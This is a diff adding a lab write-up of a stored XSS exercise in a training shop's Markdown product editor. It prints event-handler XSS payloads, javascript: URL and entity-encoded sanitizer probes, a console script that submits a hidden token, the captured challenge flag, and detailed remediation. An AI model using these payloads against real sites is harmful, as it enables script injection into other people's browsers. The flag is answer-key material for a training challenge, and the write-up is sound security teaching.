@@ -1018,3 +1018,701 @@ The final exploit successfully invoked the lab C2 toolkit and obtained the Stage
 **The main security lesson is that JSON transport does not guarantee safe DOM rendering.** Untrusted data becomes dangerous when it is passed to HTML-parsing sinks such as `innerHTML`, and protecting one profile field does not secure other fields rendered by the same frontend.
 
 
+
+
+## Task 4: Stored XSS - Markdown Editor
+
+### Vulnerability Description
+
+A Stored Cross-Site Scripting (XSS) vulnerability was identified in the NexusShop product description editor. The application allows administrators to write product descriptions in Markdown, which is converted into HTML and displayed in a Live Preview. If the Markdown renderer permits unsafe HTML or the sanitizer fails to remove executable content, attacker-controlled JavaScript can execute when the stored description is rendered.
+
+The vulnerability originates from the Markdown-to-HTML processing pipeline and the use of Jinja2's `|safe` filter, which disables automatic HTML escaping of the generated output. Stage 1 permits raw HTML, including JavaScript event handlers. Stage 2 escapes `<script>` tags but still permits executable event handlers. Stage 3 introduces stricter sanitization, successfully blocking the event-handler payloads tested, although inconsistent handling of `javascript:` URLs was identified.
+
+The investigation confirmed stored XSS execution in Stages 1 and 2. Stage 3 demonstrated potentially unsafe URL sanitization behavior, but no working JavaScript execution payload was established. The challenge flag was obtained separately through the application's tracking endpoint.
+
+### Location & Parameters
+
+| Attribute | Details |
+|-----------|---------|
+| **Application** | NexusShop |
+| **Base URL** | `http://web0x0c.hbtn` |
+| **Stage 1 URL** | `/admin/products/1/edit` |
+| **Stage 2 URL** | `/admin/products/1/edit/safe` |
+| **Stage 3 URL** | `/admin/products/1/edit/strict` |
+| **Parameter/Field** | `description` |
+| **HTTP Method** | `POST` |
+| **Content Type** | `application/x-www-form-urlencoded` |
+| **Vulnerable Component** | Markdown-to-HTML renderer |
+| **Output Sink** | Server-rendered HTML marked with Jinja2 `\|safe` |
+| **Type** | Stored XSS |
+| **Severity** | High for Stages 1 and 2; Stage 3 exploitability unconfirmed |
+| **Challenge Level** | 6 |
+| **Tracking Endpoint** | `/admin/products/api/track` |
+| **Flag File** | `web_application_security/websec_0x0C/5-flag.txt` |
+
+### Attack Vector
+
+**1. Identify the Markdown-to-HTML transformation**
+
+Navigate to:
+
+```text
+http://web0x0c.hbtn/admin/products/1/edit
+```
+
+Enter a normal Markdown description:
+
+```markdown
+**MARKDOWN_STAGE1_TEST**
+```
+
+Click **Update Description**.
+
+The Live Preview displays `MARKDOWN_STAGE1_TEST` in bold without the literal Markdown delimiters.
+
+This confirms that the application converts Markdown into HTML before displaying it.
+
+**2. Stage 1: Confirm raw HTML injection**
+
+Replace the Markdown description with:
+
+```html
+<b id="stage1-html-probe">STAGE1_HTML_OK</b>
+```
+
+Save and reload the page.
+
+Firefox Inspector shows:
+
+```html
+<div class="prose prose-invert prose-sm max-w-none">
+    <p>
+        <b id="stage1-html-probe">STAGE1_HTML_OK</b>
+    </p>
+</div>
+```
+
+The browser creates an actual `<b>` element, confirming that raw HTML survives the Markdown transformation.
+
+The surrounding template also contains:
+
+```html
+<!-- VULNERABLE: description contains markdown-converted HTML rendered with |safe -->
+```
+
+This identifies the unsafe rendering context.
+
+**3. Stage 1: Demonstrate stored JavaScript execution**
+
+Replace the description with:
+
+```html
+<img src=x onerror="console.log('MARKDOWN_STAGE1_XSS_EXECUTED')">
+```
+
+Click **Update Description**, then reload the page.
+
+The Firefox Console displays:
+
+```text
+MARKDOWN_STAGE1_XSS_EXECUTED
+```
+
+Inspector confirms:
+
+```html
+<p>
+    <img src="x" onerror="console.log('MARKDOWN_STAGE1_XSS_EXECUTED')">
+</p>
+```
+
+The invalid image source triggers the `error` event, which executes the supplied JavaScript.
+
+Because execution occurs again after reloading, this confirms persistent stored XSS.
+
+**Result: Stage 1 stored XSS confirmed.**
+
+**4. Stage 2: Test the partial sanitizer**
+
+Navigate to:
+
+```text
+http://web0x0c.hbtn/admin/products/1/edit/safe
+```
+
+Submit:
+
+```html
+<script>console.log('STAGE2_SCRIPT_EXECUTED')</script>
+<img src=x onerror="console.log('MARKDOWN_STAGE2_XSS_EXECUTED')">
+```
+
+After saving and reloading, Inspector shows:
+
+```html
+<div class="prose prose-invert prose-sm max-w-none">
+    &lt;script&gt;console.log('STAGE2_SCRIPT_EXECUTED')&lt;/script&gt;
+    <p>
+        <img src="x" onerror="console.log('MARKDOWN_STAGE2_XSS_EXECUTED')">
+    </p>
+</div>
+```
+
+The sanitizer escapes the `<script>` element, preventing it from becoming executable HTML.
+
+However, the `<img>` element and its `onerror` attribute remain intact.
+
+Firefox Console:
+
+```text
+MARKDOWN_STAGE2_XSS_EXECUTED
+```
+
+The `STAGE2_SCRIPT_EXECUTED` marker does not appear.
+
+This demonstrates that filtering `<script>` elements alone does not prevent XSS. Event-handler attributes can still execute JavaScript without requiring a `<script>` tag.
+
+**Result: Stage 2 stored XSS confirmed.**
+
+**5. Stage 3: Test the strict sanitizer**
+
+Navigate to:
+
+```text
+http://web0x0c.hbtn/admin/products/1/edit/strict
+```
+
+Submit:
+
+```html
+<img src=x onerror="console.log('MARKDOWN_STAGE3_XSS_EXECUTED')">
+```
+
+After saving, Inspector shows:
+
+```html
+<p>
+    &lt;img src=x onerror="console.log('MARKDOWN_STAGE3_XSS_EXECUTED')"&gt;
+</p>
+```
+
+The entire image element is escaped and displayed as text.
+
+No `MARKDOWN_STAGE3_XSS_EXECUTED` message appears in the Console.
+
+The strict sanitizer therefore blocks the event-handler payload that succeeded in Stages 1 and 2.
+
+**6. Stage 3: Investigate Markdown link sanitization**
+
+Because raw HTML injection was blocked, the investigation moved to Markdown-generated links and URL scheme validation.
+
+A normal HTTPS link was accepted:
+
+```markdown
+[STAGE3_SAFE_LINK](https://example.com)
+```
+
+Rendered HTML:
+
+```html
+<a href="https://example.com">STAGE3_SAFE_LINK</a>
+```
+
+A JavaScript URL containing a function call was rejected:
+
+```markdown
+[STAGE3_XSS_PROOF](java&#x73;cript:console.log%28%27STAGE3_ENTITY_XSS_EXECUTED%27%29)
+```
+
+Rendered HTML:
+
+```html
+<a>STAGE3_XSS_PROOF</a>
+```
+
+However, a minimal JavaScript URL was preserved:
+
+```markdown
+[STAGE3_PLAIN_JS](javascript:1)
+```
+
+Rendered HTML:
+
+```html
+<a href="javascript:1">STAGE3_PLAIN_JS</a>
+```
+
+This exposed an inconsistency in URL filtering.
+
+Additional tests produced:
+
+| URL expression | Result |
+|---|---|
+| `javascript:1` | `href` preserved |
+| `javascript:2` | `href` preserved |
+| `javascript:0x10` | `href` removed |
+| `javascript:true` | `href` removed |
+| `javascript:1+1` | `href` removed |
+| `javascript:1-1` | `href` removed |
+| `javascript:%31` | `href` removed |
+| `javascript:window.name=1337` | `href` removed |
+| `java&#x73;cript:1` | `href` preserved |
+
+The sanitizer therefore does not consistently reject the `javascript:` scheme. Its acceptance depends on the expression following the scheme.
+
+Nevertheless, attempts to execute useful JavaScript expressions through these links were unsuccessful. The tests did not establish a working Stage 3 XSS exploit.
+
+**7. Investigate repeated Markdown processing**
+
+After saving a Markdown link, the editor sometimes contained transformed HTML rather than the original Markdown.
+
+For example:
+
+```html
+<p><a href="java&#x73;cript:1">STAGE3_DOUBLE_PASS</a></p>
+```
+
+The same HTML was submitted again through **Update Description**.
+
+The captured HTTP request confirmed:
+
+```http
+POST /admin/products/1/edit/strict
+Content-Type: application/x-www-form-urlencoded
+```
+
+Request parameter:
+
+```text
+description=<p><a href="java&#x73;cript:1">STAGE3_DOUBLE_PASS</a></p>
+```
+
+The server returned HTTP `200 OK`.
+
+The resulting page source still contained:
+
+```html
+<a href="java&#x73;cript:1">STAGE3_DOUBLE_PASS</a>
+```
+
+Firefox Inspector displayed the browser-decoded attribute:
+
+```html
+<a href="javascript:1">STAGE3_DOUBLE_PASS</a>
+```
+
+This demonstrates that the potentially unsafe link survives repeated processing.
+
+It does not, by itself, prove that repeated processing introduces a new vulnerability.
+
+**8. Verify the product page**
+
+Navigate to:
+
+```text
+http://web0x0c.hbtn/product/1
+```
+
+The public product page continued to display the original description:
+
+```text
+High-performance laptop with quantum processing capabilities and 32GB RAM
+```
+
+The modified Markdown description was not observed on this page.
+
+Consequently, the confirmed execution context for Stages 1 and 2 was the administrator's Live Preview. Propagation of the injected content to ordinary product-page visitors was not demonstrated.
+
+**9. Identify the challenge level and tracking endpoint**
+
+Decoding the session cookie payload revealed:
+
+```json
+{
+    "flags": [],
+    "level_6_stage": 3
+}
+```
+
+The session also contained a session identifier, omitted here.
+
+This confirmed that Task 4 corresponds to Level 6, Stage 3.
+
+The tracking endpoint was identified using:
+
+```bash
+curl -i 'http://web0x0c.hbtn/admin/products/api/track?t=test'
+```
+
+Response:
+
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+```
+
+```json
+{
+    "status": "error"
+}
+```
+
+This confirmed that the endpoint exists, although the test token was invalid.
+
+**10. Capture the Stage 3 flag**
+
+The challenge page contains a hidden tracking token in an element with ID `tracking-id`.
+
+Using Firefox Developer Tools in the existing browser session, the token was read and submitted directly to the tracking endpoint.
+
+The tracking request returned:
+
+```json
+{
+    "ref": "FLAG{d4b938b857e1527252b213ae3ba6f364}",
+    "status": "tracked"
+}
+```
+
+**Result: Stage 3 challenge flag captured successfully.**
+
+Importantly, the successful tracking call was executed directly from the browser Console. It was not triggered by a stored XSS payload, so it establishes successful flag retrieval but not Stage 3 sanitizer bypass.
+
+### Payload Used
+
+**Stage 1: Stored XSS**
+
+```html
+<img src=x onerror="console.log('MARKDOWN_STAGE1_XSS_EXECUTED')">
+```
+
+**Stage 2: Script-tag filtering bypass**
+
+```html
+<script>console.log('STAGE2_SCRIPT_EXECUTED')</script>
+<img src=x onerror="console.log('MARKDOWN_STAGE2_XSS_EXECUTED')">
+```
+
+**Stage 3: Unsafe URL handling proof**
+
+```markdown
+[STAGE3_PLAIN_JS](javascript:1)
+```
+
+Observed output:
+
+```html
+<a href="javascript:1">STAGE3_PLAIN_JS</a>
+```
+
+This demonstrated an unsafe URL surviving the sanitizer, but not arbitrary JavaScript execution.
+
+**Stage 3: Tracking token submission**
+
+The following command was executed in Firefox Developer Tools:
+
+```javascript
+(async () => {
+    const token = document.getElementById('tracking-id')?.textContent.trim();
+
+    console.log('TOKEN_FOUND:', Boolean(token));
+
+    if (!token) return;
+
+    const response = await fetch(
+        '/admin/products/api/track?t=' + encodeURIComponent(token)
+    );
+
+    console.log('TRACK_STATUS:', response.status);
+    console.log('TRACK_RESPONSE:', await response.text());
+})().catch(console.error);
+```
+
+Console output:
+
+```text
+TOKEN_FOUND: true
+TRACK_STATUS: 200
+TRACK_RESPONSE: {"ref":"FLAG{d4b938b857e1527252b213ae3ba6f364}","status":"tracked"}
+```
+
+### Evidence
+
+**1. Stage 1: JavaScript execution**
+
+Firefox Console:
+
+```text
+MARKDOWN_STAGE1_XSS_EXECUTED
+```
+
+Firefox Inspector:
+
+```html
+<img src="x" onerror="console.log('MARKDOWN_STAGE1_XSS_EXECUTED')">
+```
+
+Confirms stored JavaScript execution from the rendered Markdown description.
+
+**2. Stage 2: Incomplete sanitization**
+
+Firefox Console:
+
+```text
+MARKDOWN_STAGE2_XSS_EXECUTED
+```
+
+The `<script>` element was HTML-escaped, while the executable `onerror` attribute remained intact.
+
+Confirms a successful bypass of the partial sanitizer.
+
+**3. Stage 3: Strict sanitizer behavior**
+
+The following protections were observed:
+
+- Raw `<img onerror>` payloads were HTML-escaped.
+- Raw HTML anchor event handlers were removed.
+- Dangerous `data:image/svg+xml` image markup was escaped.
+- Most tested JavaScript URL expressions lost their `href` attributes.
+- Normal HTTPS links remained functional.
+
+However, `javascript:1` and `javascript:2` survived in link destinations.
+
+This indicates inconsistent URL scheme validation, but no Stage 3 arbitrary JavaScript execution was demonstrated.
+
+**4. HTTP request evidence**
+
+A Firefox HAR capture confirmed that:
+
+- The editor submitted the transformed description as `application/x-www-form-urlencoded`.
+- The server returned HTTP `200 OK`.
+- The returned HTML included the transformed description and Live Preview.
+- The unsafe minimal JavaScript URL survived repeated processing.
+
+**5. C2 evidence**
+
+The challenge provides a C2 dashboard at:
+
+```text
+http://web0x0c.hbtn/attacker
+```
+
+However, no C2 dashboard record demonstrating cookie theft, credential capture, or other data exfiltration was collected during this investigation.
+
+Therefore, C2 compromise evidence should not be claimed as verified.
+
+**6. Flag capture evidence**
+
+The tracking endpoint returned:
+
+```json
+{
+    "ref": "FLAG{d4b938b857e1527252b213ae3ba6f364}",
+    "status": "tracked"
+}
+```
+
+The successful response confirms that the challenge tracking mechanism accepted the submitted token.
+
+**Captured flag:**
+
+```text
+FLAG{d4b938b857e1527252b213ae3ba6f364}
+```
+
+The required submission file is:
+
+```text
+web_application_security/websec_0x0C/5-flag.txt
+```
+
+File contents:
+
+```text
+d4b938b857e1527252b213ae3ba6f364
+```
+
+### Real-World Impact
+
+A Markdown editor that converts untrusted input into executable HTML can expose administrators and other viewers to stored XSS attacks.
+
+The confirmed vulnerabilities in Stages 1 and 2 could enable:
+
+1. **Session compromise:** Reading JavaScript-accessible authentication tokens or session data and potentially using authenticated browser requests.
+
+2. **Data exfiltration:** Extracting accessible application data and transmitting it to an external endpoint.
+
+3. **Unauthorized administrative actions:** Executing requests in the context of an authenticated administrator, potentially modifying product listings, prices, or application content.
+
+4. **Credential harvesting:** Displaying fraudulent authentication forms inside a trusted administrative interface.
+
+5. **Persistent attacks:** Executing malicious JavaScript whenever an affected stored description is rendered in a vulnerable view.
+
+6. **Content manipulation:** Altering the displayed product description or surrounding interface to deceive users.
+
+In a real application, the impact depends on where the stored Markdown is rendered and which users can view it.
+
+If descriptions containing malicious HTML are displayed to customers, an administrator-controlled product editor can become a stored XSS delivery mechanism affecting product visitors.
+
+In this investigation, execution was verified in the administrative preview. Execution on the public product page was not confirmed.
+
+### Remediation
+
+**1. Sanitize generated HTML before rendering**
+
+Use a maintained, allowlist-based HTML sanitizer after converting Markdown to HTML.
+
+For Python applications, a suitable sanitizer can be configured to allow only explicitly approved HTML elements and attributes.
+
+For example, using Bleach:
+
+```python
+import bleach
+import markdown
+
+ALLOWED_TAGS = [
+    "p", "br", "strong", "em",
+    "b", "i", "ul", "ol", "li",
+    "h1", "h2", "h3", "blockquote",
+    "code", "pre", "a"
+]
+
+ALLOWED_ATTRIBUTES = {
+    "a": ["href", "title"]
+}
+
+def render_markdown(source):
+    html = markdown.markdown(source)
+
+    return bleach.clean(
+        html,
+        tags=ALLOWED_TAGS,
+        attributes=ALLOWED_ATTRIBUTES,
+        protocols=["http", "https", "mailto"],
+        strip=True
+    )
+```
+
+This example uses an explicit allowlist of HTML tags, attributes, and permitted URL schemes.
+
+**2. Do not trust Markdown-generated HTML automatically**
+
+The application currently marks converted HTML as safe for template rendering.
+
+Jinja2's `|safe` should only be applied to content that has already passed through a reliable sanitizer.
+
+Avoid:
+
+```jinja2
+{{ markdown_html | safe }}
+```
+
+Unless `markdown_html` has been sanitized correctly.
+
+The security boundary must be enforced before the HTML is marked as trusted.
+
+**3. Remove JavaScript event-handler attributes**
+
+Attributes such as `onerror`, `onload`, `onclick`, and `onmouseenter` must not be permitted in user-controlled HTML.
+
+Stage 2 demonstrates that escaping `<script>` elements is insufficient when event-handler attributes remain executable.
+
+An allowlist-based sanitizer should reject all event-handler attributes by default.
+
+**4. Validate URL schemes after canonicalization**
+
+Stage 3 demonstrated inconsistent handling of `javascript:` URLs.
+
+URL validation should normalize and decode the relevant input before determining whether its scheme is permitted.
+
+Reject dangerous schemes such as:
+
+```text
+javascript:
+vbscript:
+```
+
+Restrict `data:` URLs according to an explicit security policy.
+
+Only necessary protocols, such as `http:`, `https:`, and optionally `mailto:`, should be allowed in Markdown links.
+
+Validation must be applied consistently to raw HTML anchors and Markdown-generated links.
+
+**5. Define a consistent Markdown processing pipeline**
+
+The application was observed returning transformed HTML to the editor after saving.
+
+A safer architecture is:
+
+```text
+Original Markdown
+      |
+      v
+Markdown Parser
+      |
+      v
+HTML Sanitizer
+      |
+      v
+Trusted Rendered HTML
+```
+
+Store the original Markdown separately from the sanitized rendered HTML.
+
+Avoid repeatedly feeding generated HTML back into the Markdown parser without a clearly defined policy.
+
+**6. Implement Content Security Policy**
+
+Use a restrictive Content Security Policy to reduce the impact of any sanitizer failures.
+
+For example:
+
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
+```
+
+The policy should avoid allowing inline event handlers and restrict executable script sources.
+
+CSP is a defense-in-depth control, not a replacement for HTML sanitization.
+
+**7. Add automated regression tests**
+
+Test the Markdown renderer against:
+
+- Raw HTML tags.
+- JavaScript event handlers.
+- Markdown-generated links.
+- `javascript:` URLs.
+- HTML entity-encoded URLs.
+- Percent-encoded URLs.
+- `data:` image URLs.
+- Repeated Markdown-to-HTML transformations.
+- Stored content rendered after page reload.
+
+Assertions should examine the final browser DOM, not just the original Markdown source or intermediate HTML.
+
+Security testing should also verify whether the stored content is rendered in the administrator's preview, public product pages, or both.
+
+### Conclusion
+
+Task 4 investigated stored XSS vulnerabilities in the NexusShop Markdown editor across three sanitizer configurations.
+
+| Stage | Finding | Outcome |
+|---|---|---|
+| **1: Raw** | Raw HTML and event handlers allowed | Stored XSS confirmed |
+| **2: Sanitized** | Script tags escaped, event handlers preserved | Stored XSS confirmed |
+| **3: Strict** | Raw event handlers blocked, inconsistent JavaScript URL filtering | Sanitizer weakness identified; XSS execution unconfirmed |
+
+The investigation demonstrated that incomplete Markdown sanitization can allow executable HTML to survive server-side processing.
+
+The Stage 3 tests also showed that the strict sanitizer does not consistently reject the `javascript:` scheme, although all tested expressions capable of demonstrating a visible effect were rejected.
+
+The challenge's Stage 3 flag was successfully retrieved through the tracking endpoint using the active browser session. This was a direct token submission rather than an XSS-triggered callback.
+
+**Final flag:**
+
+```text
+FLAG{d4b938b857e1527252b213ae3ba6f364}
+```
+
+The central security lesson is that Markdown is not inherently safe. Security depends on how the Markdown is converted, sanitized, stored, and inserted into the final HTML document. Even a stricter sanitizer can exhibit inconsistent behavior if HTML parsing, entity decoding, and URL validation are not handled coherently.
